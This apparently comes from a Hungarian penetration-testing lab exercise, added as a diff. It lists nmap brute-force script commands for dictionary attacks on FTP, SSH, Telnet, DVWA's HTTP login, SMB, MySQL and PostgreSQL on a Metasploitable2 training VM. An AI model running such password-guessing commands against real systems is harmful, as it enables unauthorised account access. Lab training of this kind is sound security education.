@@ -1,0 +1,30 @@
+A Metasploitable2 VM IP címe: 192.168.56.254
+
+Szótáralapú támadások különböző szolgáltatások ellen.
+
+1. A Metasploitable2 VM nyitott portjainak a megkeresése:
+
+2. Jelszavak online megkeresése.
+2.1 FTP
+sudo nmap -p21 --script ftp-brute.nse --script-args userdb=users2,passdb=passwords 192.168.56.254
+
+2.2 SSH
+sudo nmap -p22 --script ssh-brute.nse --script-args userdb=users2,passdb=passwords 192.168.56.254
+
+2.3 Telnet
+sudo nmap -p23 --script telnet-brute.nse --script-args userdb=users2,passdb=passwords 192.168.56.254
+
+2.4 Http
+A "dvwa" tesztalkalmazás belépési oldala ezen a címen érhető el:
+http://192.168.56.254/dvwa/login.php
+
+sudo nmap -p80 --script http-form-brute.nse --script-args "userdb=users3,passdb=passwords3,http-form-brute.path=/dvwa/login.php" 192.168.56.254
+
+2.5 SMB
+sudo nmap -p445 --script smb-brute.nse --script-args userdb=users2,passdb=passwords 192.168.56.254
+
+2.6 Mysql
+sudo nmap -p3306 --script mysql-brute.nse --script-args userdb=users3,passdb=passwords3 192.168.56.254
+
+2.7 Postgresql
+sudo nmap -p5432 --script pgsql-brute.nse --script-args userdb=users3,passdb=passwords3 192.168.56.254
